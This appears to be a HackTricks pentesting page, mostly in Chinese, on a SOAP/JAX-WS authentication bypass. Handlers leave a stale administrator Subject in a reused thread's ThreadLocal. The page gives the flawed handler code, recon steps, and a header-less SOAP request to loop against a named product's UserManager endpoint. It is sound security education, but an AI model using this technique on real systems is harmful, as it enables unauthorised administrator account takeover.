# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## TL;DR

- 一些中间件链会将已认证的 `Subject`/`Principal` 存储在静态的 `ThreadLocal` 中，且仅在接收到专有的 SOAP header 时才刷新它。
- 由于 WebLogic/JBoss/GlassFish 会回收工作线程，省略该 header 会导致该线程最后处理的具有特权的 `Subject` 被静默重用。
- 用不带 header 但格式正确的 SOAP bodies 不断击打易受攻击的 endpoint，直到被重用的线程授予你被盗的管理员上下文。

## 根本原因

类似下面的 Handler 只有在自定义 header 存在时才会覆盖线程本地的身份（`ThreadLocal`），因此前一个请求的上下文会继续存在：
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## 侦察

1. 枚举反向代理 / 路由规则以定位可能阻止 `?wsdl` 但接受 POSTs 的隐藏 SOAP 树（将它们与 [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md) 的流程并列映射）。
2. 解压 EAR/WAR/EJB 工件 (`unzip *.ear`)，检查 `application.xml`、`web.xml`、`@WebService` 注解和 handler chains（例如 `LoginHandlerChain.xml`），以发现 handler 类、SOAP header 的 QName 以及后端 EJB 名称。
3. 如果元数据缺失，暴力枚举可能的 `ServiceName?wsdl` 路径或临时放宽实验室代理，然后将恢复的 WSDL 导入诸如 [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) 的工具以生成基线 SOAP envelopes。
4. 审查 handler 源码，查找 `ThreadLocal` 保存器（例如 `SubjectHolder.setSubject()`）——当认证 header 缺失或格式不正确时这些保存器可能不会被清除。

## 利用

1. 发送带有专有 header 的有效请求以了解正常的响应代码和用于无效令牌的错误响应。
2. 在省略 header 的情况下重发相同的 SOAP body。保持 XML 格式良好并遵守所需的命名空间，以便 handler 能干净地退出。
3. 循环发送该请求；当请求落到先前执行过特权操作的线程上时，重用的 `Subject` 会解锁受保护的操作，例如用户或凭证管理器。
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## 验证该漏洞

- 附加 JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) 或类似的调试挂钩，以便在每次调用之前和之后观察 `ThreadLocal` 的内容，确认未经身份验证的请求继承了先前管理员的 `Subject`。

## References

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
